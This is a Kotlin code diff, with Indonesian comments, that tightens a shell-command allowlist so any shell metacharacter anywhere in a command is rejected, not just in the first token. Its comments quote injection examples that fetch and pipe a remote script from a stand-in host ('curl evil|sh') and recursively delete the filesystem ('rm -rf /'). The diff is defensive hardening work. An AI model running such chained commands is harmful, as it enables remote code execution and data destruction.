@@ -36,15 +36,19 @@ class ExecRunner(
         /** Timeout default satu command di distro (apk add bisa lama). */
         const val PROOT_DEFAULT_TIMEOUT_MS = 60_000L
         const val MAX_OUT = 200_000
+
+        /** Metachar shell yang dilarang saat allowlist aktif (command dijalankan via `sh -c`). */
+        private val SHELL_METACHARS = setOf(';', '|', '&', '$', '`', '(', ')', '<', '>', '\\', '\n', '\r')
     }
 
     private fun isAllowed(command: String, allowlist: List<String>): Boolean {
         val prefixes = allowlist.map { it.trim() }.filter { it.isNotEmpty() }
         if (prefixes.isEmpty()) return true
         val trimmed = command.trim()
-        // Tolak metachar shell pada token pertama (mencegah "git status; curl evil|sh").
-        val firstToken = trimmed.split(Regex("\\s+")).firstOrNull() ?: return false
-        if (firstToken.any { it == ';' || it == '|' || it == '&' || it == '$' || it == '`' || it == '(' || it == ')' || it == '<' || it == '>' || it == '\\' }) return false
+        // Tolak metachar shell di mana pun, bukan hanya token pertama: command
+        // dijalankan lewat `sh -c`, jadi "git status; rm -rf /" tetap bisa jalan
+        // walau "git" ada di allowlist.
+        if (trimmed.any { it in SHELL_METACHARS }) return false
         // Prefix match hanya pada batas token ("git" tidak meloloskan "github-cli").
         return prefixes.any { entry ->
             trimmed.startsWith(entry) && (trimmed.length == entry.length || trimmed[entry.length].isWhitespace())
